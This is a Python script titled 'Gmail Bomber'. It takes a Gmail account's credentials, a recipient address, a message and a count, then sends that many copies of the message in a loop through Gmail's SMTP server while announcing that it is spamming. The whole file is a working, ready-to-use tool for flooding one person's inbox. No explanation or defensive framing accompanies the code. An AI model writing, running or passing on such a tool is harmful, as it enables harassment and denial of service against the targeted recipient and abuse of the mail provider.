import smtplib
from email.message import EmailMessage
import getpass
import time

def send_email(sender, password, recipient, subject, body):
    msg = EmailMessage()
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject
    msg.set_content(body)
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender, password)
        server.send_message(msg)
        return True

def run():
    print("=" * 50)
    print("Gmail Bomber..")
    print("=" * 50)
    
    sender = input("Sender Gmail Address?.. ")
    password = getpass.getpass("Sender Gmail Password?.. ")
    recipient = input("Recipient Email Address?.. ")
    subject = input("Email Subject?.. ")
    body = input("Message?.. ")
    
    try:
        count = int(input("How many emails to send?.. "))
    except ValueError:
        print("Invalid number. Defaulting to 10.")
        count = 10
    
    print(f"\nSpamming {count} emails...")
    
    try:
        for i in range(count):
            if send_email(sender, password, recipient, subject, body):
                print(f"Email {i+1}/{count} sent successfully!")
            else:
                print(f"Email {i+1}/{count} failed!")
                
    except Exception as e:
        print(f"\nError: {e}")
    
    input("\nPress Enter to return...")

if __name__ == "__main__":
    run()